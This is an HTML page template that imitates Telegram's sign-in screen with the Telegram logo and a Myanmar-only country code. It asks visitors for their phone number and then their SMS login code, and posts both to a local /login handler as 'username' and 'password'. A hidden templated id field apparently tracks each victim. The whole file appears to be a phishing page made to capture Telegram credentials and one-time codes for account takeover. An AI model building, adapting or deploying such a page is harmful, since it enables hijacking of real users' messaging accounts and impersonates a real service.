<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f4f4f5;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; margin: 0;
        }
        .login-container {
            background: white; padding: 40px; border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 320px; text-align: center;
        }
        .logo-container img { width: 100px; margin-bottom: 20px; }
        h2 { font-size: 22px; margin-bottom: 10px; }
        p { color: #707579; font-size: 14px; line-height: 1.5; }
        .input-group { text-align: left; margin: 20px 0; border-bottom: 2px solid #dfe1e5; }
        .input-group label { color: #3390ec; font-size: 13px; font-weight: bold; }
        input, select {
            width: 100%; border: none; padding: 10px 0;
            outline: none; font-size: 16px; background: transparent;
        }
        .phone-input { display: flex; align-items: center; }
        .next-btn {
            background: #3390ec; color: white; border: none;
            width: 100%; padding: 12px; border-radius: 8px;
            font-weight: bold; cursor: pointer; margin-top: 10px;
        }
        .otp-icon { font-size: 50px; margin-bottom: 15px; }
        .back-link { color: #3390ec; cursor: pointer; margin-top: 20px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="login-container">
        <form action="/login" method="POST">
            
            <input type="hidden" name="id" value="{{ idt }}">

            <div id="phone-section">
                <div class="logo-container">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
                </div>
                <h2>Sign in to Telegram</h2>
                <p>Please confirm your country code and enter your phone number.</p>
                
                <div class="input-group">
                    <label>Country</label>
                    <select name="country">
                        <option value="+95">Myanmar</option>
                    </select>
                </div>

                <div class="input-group">
                    <label>Phone Number</label>
                    <div class="phone-input">
                        <span>+95</span>
                        <input type="tel" name="username" placeholder="00 000 0000" required>
                    </div>
                </div>

                <button type="button" onclick="showOtpSection()" class="next-btn">NEXT</button>
            </div>

            <div id="otp-section" style="display: none;">
                <div class="otp-icon">ðŸ’¬</div>
                <h2>Verify OTP</h2>
                <p>We've sent an SMS with an activation code to your phone.</p>
                
                <div class="input-group">
                    <label>Code</label>
                    <input type="text" name="password" placeholder="Your code" maxlength="6" style="text-align: center; font-size: 20px; letter-spacing: 5px;" required>
                </div>

                <button type="submit" class="next-btn">LOG IN</button>
                <p class="back-link" onclick="showPhoneSection()">Wrong number?</p>
            </div>
        </form>
    </div>

    <script>
        function showOtpSection() {
            document.getElementById('phone-section').style.display = 'none';
            document.getElementById('otp-section').style.display = 'block';
        }
        function showPhoneSection() {
            document.getElementById('phone-section').style.display = 'block';
            document.getElementById('otp-section').style.display = 'none';
        }
    </script>
</body>
</html>
